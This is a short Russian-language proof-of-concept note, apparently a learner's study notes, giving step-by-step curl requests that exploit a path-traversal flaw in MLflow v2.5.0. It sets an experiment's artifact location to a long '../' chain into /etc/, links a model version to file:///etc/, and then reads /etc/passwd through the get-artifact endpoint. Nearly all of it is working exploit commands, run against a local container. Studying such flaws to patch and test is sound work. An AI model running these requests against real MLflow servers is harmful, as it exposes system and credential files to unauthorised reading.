mlflow

### 1. Запусти Docker-контейнер MLflow

```bash
docker run -p 5001:5000 ghcr.io/mlflow/mlflow:v2.5.0 mlflow server --host 0.0.0.0
```

### 2. Создай experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "artifact_location": "http:///?/../../../../../../../../../../../../../../etc/"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/experiments/create'
```

- experiment —
- _что делает очень много двоеточий?_
- _что такое etc?_

### 3. Создай run в experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"experiment_id": "{{EXPERIMENT_ID}}"}' \
    'http://127.0.0.1:5001/api/2.0/mlflow/runs/create'
```

### 4. Создай registered model

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/registered-models/create'
```

### 5. Привяжи registered model к run

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/model-versions/create'
```

### ???

### 6. PROFIT. Прочитай /etc/passwd

```bash
curl 'http://127.0.0.1:5001/model-versions/get-artifact?path=passwd&name=poc&version=1'
```
